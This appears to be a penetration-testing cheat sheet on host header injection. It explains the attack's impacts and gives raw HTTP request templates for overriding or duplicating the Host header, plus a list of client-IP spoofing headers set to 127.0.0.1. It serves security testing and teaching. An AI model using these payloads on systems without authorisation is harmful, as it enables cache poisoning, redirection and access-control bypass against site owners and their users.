# What is a Host Header Attack
Host header injection is a type of web vulnerability that involves manipulating the Host header in HTTP requests to potentially exploit web applications. This header is used by web servers to determine the hostname of the requested resource. If not properly validated or sanitized, attackers can exploit this header to perform various malicious activities.

### Host header exploit 
1.	**Web Cache Poisoning**:
	•	If a web application or cache server uses the Host header to generate cached responses, an attacker can manipulate the header to poison the cache with malicious content.
2.	**Open Redirects**:
	•	Attackers might use the Host header to exploit open redirect vulnerabilities. By injecting a malicious domain, they can trick users into visiting harmful sites.
3.	**Cross-Site Scripting (XSS)**:
	•	If the application includes the Host header in its response without proper sanitization, it might be possible for an attacker to inject malicious scripts that execute in the user’s browser.
4.	**Internal Resource Access**:
	•	An attacker might be able to exploit misconfigurations to access internal resources or services by manipulating the Host header to point to internal domains.
5.	**Security Misconfigurations**:
	•	Some applications might rely on the Host header to determine authorization rules or application behavior. Incorrect assumptions can lead to privilege escalation or unauthorized access.
6. **Routing-based-SSRF**
    - If an SSR application uses the Host header to determine which content or application logic to apply, an attacker could manipulate this header to redirect users or access unauthorized content.


**Example**
```
    GET / HTTP/1.1
    Host: www.epochcyber.in
    X-Forwarded-Host: www.attacker.com
    ...
```

### How to Exploit
1. Change The Host header value 
```
    GET /about HTTP/1.1 
    Host: www.attacker.com 
    ....

```
2. Use Double Host header value 
```
    GET /about HTTP/1.1
    Host: www.vulnerable-webiste.conm 
    Host: www.attacker.com
    ...
``` 
3. Add an absolute URL 
```
    GET https://Vulnerable-website.com HTTP/1.1
    Host: www.attacker.conm
    ...
``` 
4. Add Host override headers
```
    GET / HTTP/1.1
    Host: www.vulnerable-website.com
    X-Forwarded-Host: www.attacker.com
    ...
```
5. Some Website omit the port from the host header
```
    GET /example HTTP/1.1 
    Host: vulnerable-website.com:bad-stuff-here
    ...

```
6. use arbitary domain name ( for arbitary hostname, you register a hostname)
``` 
    GET /path HTTP/1.1
    Host: notvulnerable-website.com
    ...
```
7. try less secure domain 
```
    GET /path HTTP/1.1
    Host: hacked-subdomain.vulnerable-website.com
    ...
```
8. Add line wrapping 
```
    GET /path HTTP/1.1
            Host: www.attacker.com
    Host: Vulnerable-website.com
```
### you can use  similar host header
```
    1. X-Host
    2. X-Forwarded-Server
    3. X-HTTP-Host-Override
    4. Forwarded
```

### Headers to Change a Location
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
Via: 1.0 fred, 1.1 127.0.0.1
Connection: close, X-Forwarded-For (Check hop-by-hop headers)

```

### **References**
1. [Acunetix --> host header article ](https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/)
2. [portswigger--> host header](https://portswigger.net/web-security/host-header/exploiting#how-to-test-for-vulnerabilities-using-the-http-host-header)